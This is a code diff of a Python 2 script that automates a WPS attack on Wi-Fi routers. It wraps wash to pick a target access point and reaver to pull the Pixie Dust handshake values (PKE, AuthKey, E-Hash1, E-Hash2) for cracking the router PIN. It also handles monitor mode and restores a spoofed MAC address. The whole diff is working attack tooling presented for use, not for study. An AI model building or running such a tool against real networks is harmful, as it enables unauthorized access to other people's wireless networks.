@@ -122,6 +122,7 @@ def get_best_intf(wifi_intfs):
         if count == 0:
             print '['+G+'+'+W+'] Networks discovered by '+G+iface+W+': '+T+str(count)+W
             print '['+R+'-'+W+'] Rescanning '+G+iface+W
+            time.sleep(3)
             count = iface_scan(iface)
         scanned_aps.append((count, iface))
         print '['+G+'+'+W+'] Networks discovered by '+G+iface+W+': '+T+str(count)+W
@@ -137,40 +138,26 @@ def iface_scan(iface):
            count += 1
     return count
 
-def select_target(mon_iface):
-    '''
-    Run and parse wash to gather WPS APs, then prompt user for target
-    '''
-    output = []
-    filename = 'wash.log'
-    try:
-        with io.open(filename, 'wb') as writer, io.open(filename, 'rb', 1) as reader:
-            cmd = 'wash -i {} -C'.format(mon_iface)
-            print '[*] Running `{}`'.format(cmd)
-            time.sleep(3)
-            proc = Popen(cmd.split(), stdout=writer)
-            # wash never stops
-            while proc.poll() is None:
-                output += reader.readlines()
-                targets = print_targets(output)
-                time.sleep(.25)
-    except KeyboardInterrupt:
-        choice = raw_input('[*] Enter the number of your choice: ')
-        return targets[choice]
-
-def get_streaming_output(filename, cmd, parse_output, *args):
+def parse_streaming_output(filename, cmd, parse_output, *args):
     '''
     Run and parse wash to gather WPS APs, then prompt user for target
     '''
     output = []
     with io.open(filename, 'wb') as writer, io.open(filename, 'rb', 1) as reader:
         print '[*] Running `{}`'.format(cmd)
+        time.sleep(3)
         proc = Popen(cmd.split(), stdout=writer)
         # wash never stops
         try:
             while proc.poll() is None:
                 output += reader.readlines()
                 results = parse_output(output)
+
+                # Just for running reaver
+                if type(results) == list:
+                    if len(results) == 4:
+                        return results
+
                 time.sleep(.25)
         except KeyboardInterrupt:
             return results
@@ -182,9 +169,9 @@ def print_targets(output):
     os.system('clear')
     print '[*] Targets:\n'
     targets = get_targets(output)
-    for idx in targets:
-        mac, chan, locked, essid = targets[idx]
-        print '[{}] {} {} {}'.format(idx, mac, essid, locked)
+    for x in targets:
+        mac, chan, locked, essid = targets[x]
+        print '[{}] {} {} {}'.format(x, mac, essid, locked)
     print '\n[*] Hit Ctrl-C to make a selection'
 
     return targets
@@ -204,7 +191,7 @@ def get_targets(out):
             mac = line[0].replace('\x00', '')
             chan = line[1]
             locked = line[4]
-            essid = line[5]
+            essid = ' '.join(line[5:])
 
             if 'yes' in locked.lower():
                 locked = 'Locked'
@@ -215,29 +202,53 @@ def get_targets(out):
 
     return targets
 
-def run_reaver(targets, mon_iface):
-    for t in targets:
-        essid, chan, mac = t
-        cmd = 'reaver -i {} -c {} -b {} -vv -S'.format(mon_iface, chan, mac)
+def parse_reaver(output):
+    os.system('clear')
+    pixie_vars = []
+    for line in output:
+        print line.strip()
+        line = line.strip().split()
+
+        if 'PKE:' in line:
+            pixie_vars = []
+            pixie_vars.append(line[-1])
+            continue
+
+        # Make sure PKE was found first
+        if len(pixie_vars) > 0:
+            if 'AuthKey:' in line:
+                pixie_vars.append(line[-1])
+            if 'E-Hash1:' in line:
+                pixie_vars.append(line[-1])
+            if 'E-Hash2:' in line:
+                pixie_vars.append(line[-1])
+
+    return pixie_vars
 
 def cleanup(orig_mac, mon_iface):
     '''
     Removes monitor mode, changes MAC back, restarts network-manager,
-    removes wash.log, and prints a closing message
+    removes wash.log, reaver.log, and prints a closing message
     '''
     os.system('ifconfig %s down' % mon_iface)
     os.system('/sbin/ip link set dev {} address {}'.format(mon_iface, orig_mac))
     os.system('iwconfig %s mode managed' % mon_iface)
     os.system('ifconfig %s up' % mon_iface)
     os.system('service network-manager restart')
-    os.system('rm wash.log')
+    os.system('rm wash.log reaver.log')
     sys.exit('\n['+R+'!'+W+'] Closing...')
 
 def main():
     args = parse_args()
     orig_mac, mon_iface = get_mon_iface(args)
-    mac, chan, locked, essid = select_target(mon_iface)
-    print 'You chose:', mac, chan, locked, essid
+    cmd = 'wash -i {} -C'.format(mon_iface)
+    targets = parse_streaming_output('wash.log', cmd, print_targets)
+    choice = raw_input('\n[*] Enter the number of your choice: ')
+    mac, chan, locked, essid = targets[choice]
+    cmd = 'reaver -i {} -c {} -b {} -vv -S'.format(mon_iface, chan, mac)
+    pixie_vars = parse_streaming_output('reaver.log', cmd, parse_reaver)
+    print pixie_vars
+    #pin = run_pixiewps(pixie_vars)
     cleanup(orig_mac, mon_iface)
 
 main()
